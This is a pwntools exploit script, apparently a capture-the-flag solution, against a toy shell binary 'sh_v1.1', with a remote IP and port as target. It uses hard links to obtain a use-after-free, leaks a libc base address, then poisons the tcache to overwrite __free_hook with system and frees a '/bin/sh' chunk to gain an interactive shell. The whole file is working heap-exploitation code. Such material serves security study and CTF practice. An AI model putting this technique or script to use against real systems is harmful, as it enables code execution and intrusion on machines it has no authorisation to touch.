from pwn import *

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
elf = ELF('./sh_v1.1')

#context.log_level = 'debug'
debug = 1

if debug:
    io = process('./sh_v1.1')
else:
    io = remote('121.40.89.206',34883)

def p():
    gdb.attach(proc.pidof(io)[0])

one_gadget = [0xe3b2e,0xe3b31,0xe3b34]

def touch(name,content):
    io.sendlineafter(b">>>>","touch " + name)
    io.send(content)

def ls():
    io.sendlineafter(b">>>>","ls ")

def cat(name):
    io.sendlineafter(b">>>>","cat " + name)

def cp(name1,name2):
    io.sendlineafter(b">>>>","cp " + name1 +" " +  name2)

def gedit(name,content):
    io.sendlineafter(b">>>>","gedit " + name)
    io.send(content)

def rm(name):
    io.sendlineafter(b">>>>","rm " + name)

def ln(name1,name2):
    io.sendlineafter(b">>>>","ln " + name1 +" " +  name2)

for i in range(9):
    touch(str(i),b'a'*8 + b'\n')
ln(str(7),"7_bak")
ln(str(6),"6_bak")

for i in range(8):
    rm(str(i))

cat("7_bak")
#libc_base = u64(io.recvuntil(b"\x7f").ljust(8,b'\x00')) -  0x1ecbe0
libc_base = u64(io.recvuntil(b"\x7f").ljust(8,b'\x00')) - 0x1ebbe0
success("libc_base -->" + hex(libc_base))
#p() # 在这找libc 小版本

# tcache posioning
hook_addr = libc_base + libc.symbols['__free_hook']
success("hook_addr -->" + hex(hook_addr))
payload = p64(hook_addr)
gedit("6_bak",payload + b'\n')

payload = p64(libc.symbols['system']+ libc_base)
touch("a", b'/bin/sh\x00\x00\n')
touch("b",payload + b'\n')
#p()
rm('a')

io.interactive()
